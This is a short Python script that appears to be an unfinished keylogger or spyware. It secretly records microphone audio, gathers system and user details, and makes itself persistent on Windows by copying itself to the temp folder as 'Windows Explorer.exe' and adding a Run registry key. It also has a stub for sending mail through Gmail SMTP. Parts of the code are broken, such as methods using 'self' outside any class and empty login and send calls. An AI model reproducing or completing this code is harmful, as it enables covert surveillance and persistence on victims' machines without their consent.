import sounddevice as sd
from scipy.io.wavfile import write
import wavio as wv
import platform
import getpass
import os
import subprocess
import sys
import shutil
import threading

from smtplib import SMTP
# Sampling frequency

def record():
    freq = 44100

    # Recording duration
    duration = 15

    # Start recorder with the given values
    # of duration and sample frequency
    recording = sd.rec(int(duration * freq),
                       samplerate=freq, channels=2)

    # Record audio for the given number of seconds
    sd.wait()

    # This will convert the NumPy array to an audio
    # file with the given sampling frequency
    write("recording0.wav", freq, recording)

    # Convert the NumPy array to audio file
    return wv.write("recording1.wav", recording, freq, sampwidth=2)


def get_system_info(self):
    uname = platform.uname()
    os = uname[0] + " " + uname[2] + " " + uname[3]
    computer_name = uname[1]
    user = getpass.getuser()
    return ("Operating System:\t" + os + "\nComputer Name:\t\t" + computer_name + "\nUser:\t\t\t\t" + user
            + "\nIP ADD:\t\t" + self.IPAddr)


def become_persistent_on_windows(self):
    evil_file_location = os.environ["temp"] + "\\Windows Explorer.exe"
    if not os.path.exists(evil_file_location):
        self.log = "** Keylogger started ** "
        shutil.copyfile(sys.executable, evil_file_location)
        subprocess.call(
            'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"',


        shell=True)

def send_mail():
    with SMTP('smtp.gmail.com', port=587) as connect:
        connect.starttls()
        connect.login()
        connect.send_message()

record()